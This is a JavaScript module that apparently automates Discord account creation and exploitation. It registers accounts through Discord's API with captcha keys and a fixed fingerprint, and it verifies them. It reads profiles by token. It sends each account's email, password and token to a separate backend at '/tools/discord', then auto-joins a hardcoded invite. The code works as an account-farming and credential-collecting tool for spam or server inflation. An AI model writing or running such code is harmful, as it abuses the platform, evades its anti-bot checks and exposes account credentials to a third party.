
import axios from "axios";
import API from "../API";



const saveOnAPI = async ({ email, username, password, token, discriminator }) => {
    const { data } = await API.post("/tools/discord", { email, username, password, token, discriminator });
    return data;
}

const joinDiscord = async (inviteCode, token) => {
    const config = {
        headers: {
            authorization: token
        }
    }
    const url = `https://discord.com/api/v9/invites/${inviteCode}`;
    const { data } = await axios.post(url, {}, config)
    return data
}


const getProfil = async (token, password) => {
    if (!password) throw Error("no password provided !")
    const config = {
        headers: {
            authorization: token,
        }
    };
    try {
        const { data } = await axios.get("https://discordapp.com/api/v6/users/@me", config);

        const account = await saveOnAPI({ ...data, password, token });

        setTimeout(() => joinDiscord("uTUkhDg69d", token), 2000)


        return `${account.username}#${account.discriminator}`;
    } catch (err) {
        return err.data ? JSON.stringify(err.data) : err.toString();
    }
}


async function registerDiscordUser(username, email, password, hcaptchaKey, fingerprint = "851204302855995444.mNUDFtE2ww6G0fBKoECy0hhDHiE") {
    const discordAPI = "https://discord.com/api/v9/auth/register";
    let payload = {
        captcha_key: hcaptchaKey != "" ? hcaptchaKey : null,
        consent: true,
        date_of_birth: "1977-05-04",
        email,
        fingerprint,
        gift_code_sku_id: null,
        invite: null,
        password,
        username,
    };
    return await axios.post(discordAPI, payload);
}

async function verifyDiscordAccount(authorizationToken, verifyToken, hcaptchaKey) {
    const url = "https://discord.com/api/v9/auth/verify"

    const config = {
        headers: { authorization: authorizationToken }
    };

    const body = {
        token: verifyToken,
        captcha_key: hcaptchaKey != "" ? hcaptchaKey : null
    };

    const { data } = await axios.post(url, body, config);

    return data;
}


export { getProfil, registerDiscordUser, verifyDiscordAccount };
